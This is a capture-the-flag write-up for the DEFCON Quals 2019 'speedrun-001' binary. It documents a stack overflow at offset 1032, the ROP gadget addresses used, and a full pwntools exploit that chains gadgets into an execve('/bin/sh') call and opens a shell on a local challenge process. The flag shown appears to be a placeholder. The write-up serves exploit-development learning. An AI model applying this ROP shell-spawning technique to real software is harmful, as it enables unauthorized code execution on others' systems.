
# DEFCON Quals 2019 - Speedrun1 Writeup

## Challenge Overview
We are given a binary called `speedrun-001`. Let's start with some initial checks:

```bash
$ file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, statically linked, for GNU/Linux 3.2.0, stripped
```

Next, we check for protections:
```bash
$ pwn checksec speedrun-001
[*] '/home/user/speedrun-001'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```


### Key Takeaways
- **NX Enabled**: We cannot execute shellcode directly on the stack.
- **No Canary**: Stack smashing is possible without detection.
- **No PIE**: Binary addresses are fixed, which simplifies ROP.

---

## Step 1: Finding the Vulnerability
We run the binary:
```bash
$ ./speedrun-001
Hello brave new challenger
Any last words?
AAAAAAAAAAA
This will be the last thing that you say: AAAAAAAAAAA

Alas, you had no luck today.
```

This hints that our input is being printed back using `printf`.

We run the binary inside GDB and interrupt execution to inspect it:
```bash
$ gdb ./speedrun-001
pwndbg> r
Hello brave new challenger
Any last words?
^C
```

Using `bt` (backtrace), we discover the main logic and its frame addresses:
```bash
pwndbg> bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```

We set a breakpoint at `0x400b90`:
```bash
pwndbg> b *0x400b90
pwndbg> r
Starting program: ./speedrun-001 
Hello brave new challenger
Any last words?
AAAAAAAAAAA
```

At this point, our input `"AAAAAAAAAAA"` is stored on the stack:
```bash
pwndbg> search AAAAAAAAAAA
[stack] 0x7fffffffd710 'AAAAAAAAAAA\n'
```

To calculate the overflow offset:
```bash
pwndbg> i f
Stack level 0, frame at 0x7fffffffdb20:
 rip = 0x400b90; saved rip = 0x400c1d
pwndbg> p 0x7fffffffdb18 - 0x7fffffffd710
$1 = 1032
```
So, the buffer size to overflow and reach the return address is **1032 bytes**.

---

## Step 2: ROP Chain Construction
The goal is to **spawn a shell**. Since NX is enabled, we must use ROP gadgets.

we can write /bin/sh at 0x6b6000 because it is a best place (rw- permission):
```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x4b6000 r-xp    b6000       0 speedrun-001
          0x6b6000           0x6bc000 rw-p     6000   b6000 speedrun-001
          0x6bc000           0x6bd000 rw-p     1000       0 [anon_006bc]
          0x6bd000           0x6e0000 rw-p    23000       0 [heap]
    0x7ffff7ff9000     0x7ffff7ffd000 r--p     4000       0 [vvar]
    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000       0 [vdso]
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack]
```

The syscalls for `execve("/bin/sh", 0, 0)` require:
```
RAX = 59 (syscall number for execve)
RDI = address of "/bin/sh"
RSI = 0
RDX = 0
syscall
```

We identify useful gadgets using ROPGadget or similar:
```
0x000000000048d251 : mov qword ptr [rax], rdx ; ret
0x000000000040129c : syscall
0x00000000004101f3 : pop rsi ; ret
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x000000000044be16 : pop rdx ; ret
0x0000000000400416 : ret
```

We will:
1. **Write "/bin/sh"** to a writable memory section (`0x6b6000`).
2. **Setup registers** for the `execve` syscall.
3. **Trigger syscall**.

---

## Step 3: Exploit Code
Here’s the final exploit:

```python
from pwn import *

# Gadgets
popRax = p64(0x0415664)
popRdi = p64(0x0400686)
popRsi = p64(0x04101f3)
popRdx = p64(0x044be16)
syscall = p64(0x040129c)
writegdt = p64(0x048d251)

p = process("./speedrun-001")
p.recvuntil(b"Any last words?")

# "/bin/sh" will be written to 0x6b6000
binsh_addr = p64(0x6b6000)

rop = b""
# Step 1: Write "/bin/sh" to memory
rop += popRdx
rop += b"/bin/sh\x00"
rop += popRax
rop += binsh_addr
rop += writegdt

# Step 2: Setup registers for execve
rop += popRax
rop += p64(0x3b)       # execve syscall number
rop += popRdi
rop += binsh_addr
rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)
rop += syscall

# Final payload
payload = b"A" * 1032 + rop
p.sendline(payload)
p.interactive()
```

---

## Step 4: Exploit Execution
Running the exploit:
```bash
$ python3 exp.py
[+] Starting local process './speedrun-001': pid 21224
[*] Switching to interactive mode
$ cat flag.txt
ctf{idk_what_happened}
```

---

## Explanation of ROP Flow

| Step | Gadget | Action |
|------|--------|--------|
| 1 | `pop rdx` | Load `"/bin/sh"` string into RDX |
| 2 | `pop rax` | Load writable memory address into RAX |
| 3 | `mov [rax], rdx` | Write string to memory |
| 4 | `pop rax` | Syscall number 59 (execve) |
| 5 | `pop rdi` | Pointer to `"/bin/sh"` |
| 6 | `pop rsi` | NULL |
| 7 | `pop rdx` | NULL |
| 8 | `syscall` | Execute syscall → Spawns shell |

---

## Notes
- The binary has a timer which kills the process if execution takes too long, so the exploit must be sent quickly.
- The `.cast` file `speed.cast` contains a full demo recording of the steps above.

---

## Final Flag
```
ctf{idk_what_happened}
```
--
